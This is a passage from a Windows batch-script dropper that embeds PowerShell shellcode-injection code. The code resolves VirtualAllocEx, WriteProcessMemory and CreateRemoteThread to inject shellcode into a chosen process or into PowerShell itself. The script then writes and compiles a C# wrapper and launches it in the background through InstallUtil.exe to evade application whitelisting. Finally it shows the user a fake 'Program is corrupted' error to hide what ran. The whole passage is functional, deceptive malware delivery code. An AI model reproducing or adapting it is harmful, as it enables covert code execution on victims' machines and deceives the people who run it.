[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate^)\n        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx\n        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]^) ([IntPtr]^)\n        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate^)\n        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory\n        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType(^)^) ([Bool]^)\n        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate^)\n        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread\n        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]^) ([IntPtr]^)\n        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate^)\n        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle\n        $CloseHandleDelegate = Get-DelegateType @([IntPtr]^) ([Bool]^)\n        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate^)\n    \n        Write-Verbose \""Injecting shellcode into PID: $ProcessId\""\n        \n        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',\n                 \""Injecting shellcode injecting into $((Get-Process -Id $ProcessId^).ProcessName^) ($ProcessId^)^^^!\"" ^) ^)\n        {\n            Inject-RemoteShellcode $ProcessId\n        }\n    }\n    else\n    {\n        # Inject shellcode into the currently running PowerShell process\n        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc\n        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]^) ([IntPtr]^)\n        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate^)\n        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree\n        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]^) ([Bool]^)\n        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate^)\n        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread\n        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]^) ([IntPtr]^)\n        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate^)\n        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject\n        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]^) ([Int]^)\n        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate^)\n        \n        Write-Verbose \""Injecting shellcode into PowerShell\""\n        \n        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',\n                 \""Injecting shellcode into the running PowerShell process^^^!\"" ^) ^)\n        {\n            Inject-LocalShellcode\n        }\n    }   \n}\n\n
set fend=Invoke-Mine -Shellcode $buf -Force""; RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create(^); Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg^); rspace.Open(^); Pipeline pipeline = rspace.CreatePipeline(^); pipeline.Commands.AddScript(command^); pipeline.Invoke(^); } }

:replace the double quotes with single quotes. yes, it's wonky but it works
set fbeg1=!fbeg1:""="!
set fbeg2=!fbeg2:""="!
set fbeg3=!fbeg3:""="!
set fbeg4=!fbeg4:""="!
set fend=!fend:""="!

:output strings to the inv.cs file without adding \r\n
set /p=!fbeg1!<nul > c:\temp\inv.cs
set /p=!fbeg2!<nul >> c:\temp\inv.cs
set /p=!fbeg3!<nul >> c:\temp\inv.cs
set /p=!fbeg4!<nul >> c:\temp\inv.cs
set /p=%bytecode%<nul >> C:\temp\inv.cs
set /p=!fend!<nul >> C:\temp\inv.cs

:compile the program using the correct architechture framework 
:and adding in the system.management.automation.dll reference that
:is needed for powershell execution
C:\Windows\Microsoft.NET\Framework%_Bitness%\v2.0.50727\csc.exe /r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:C:\temp\run.exe C:\temp\inv.cs > nul

:run the program using the InstallUtil method and start it as a background process
start /b C:\Windows\Microsoft.NET\Framework%_Bitness%\v2.0.50727\InstallUtil.exe /logfile=C:\temp\log.txt /LogToConsole=false /U C:\temp\run.exe > nul

endlocal

:turn echo back on and give some output to the user
@echo on
@echo.
@echo Launching program....
@echo Error...
@echo Program is corrupted, please try downloading again.
@echo.
